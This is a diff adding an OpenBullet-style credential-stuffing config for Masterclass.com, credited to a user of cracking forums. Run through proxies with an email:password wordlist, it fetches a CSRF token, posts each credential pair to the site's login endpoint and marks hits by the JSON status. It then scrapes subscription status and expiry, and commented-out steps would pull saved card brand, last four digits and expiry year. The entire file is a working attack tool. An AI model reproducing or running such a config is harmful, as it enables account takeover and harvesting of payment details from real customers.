@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Masterclass.com",
+  "SuggestedBots": 200,
+  "LastModified": "2019-06-01T10:42:07.1514786-04:00",
+  "AdditionalInfo": "",
+  "Author": "By FaceSteel nulled.to/cracked.to",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.masterclass.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Token PARSE "<SOURCE>" LR "<meta name=\"csrf-token\" content=\"" "\" />" -> VAR "CSRF" 
+REQUEST POST "https://www.masterclass.com/auth/identity/callback" 
+  CONTENT "next_page=&auth_key=<USER>&password=<PASS>&provider=identity" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.masterclass.com" 
+  HEADER "referer: https://www.masterclass.com/" 
+  HEADER "x-csrf-token: <CSRF>" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"success" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"failed\"}" 
+!REQUEST GET "https://www.masterclass.com/api/v1/credit_cards" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+!  HEADER "authority: www.masterclass.com" 
+!  HEADER "method: GET" 
+!  HEADER "path: /api/v1/credit_cards" 
+!  HEADER "scheme: https" 
+!  HEADER "accept: application/json" 
+!  HEADER "referer: https://www.masterclass.com/account/edit" 
+!  HEADER "x-csrf-token: <CSRF>" 
+!PARSE "<SOURCE>" JSON "brand" -> CAP "Payment Method" 
+!PARSE "<SOURCE>" JSON "last_four_digits" -> CAP "Last Four" 
+!PARSE "<SOURCE>" JSON "exp_year" -> CAP "Expires" 
+REQUEST GET "https://www.masterclass.com/homepage" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authority: www.masterclass.com" 
+  HEADER "method: GET" 
+  HEADER "path: /homepage" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+PARSE "<SOURCE>" LR "active_annual_pass&quot;:" ",&quot" -> CAP "Active Annual Pass" 
+PARSE "<SOURCE>" LR "expiration_date&quot;:&quot;" "&quot;,&quot" -> CAP "Expiration Date" 
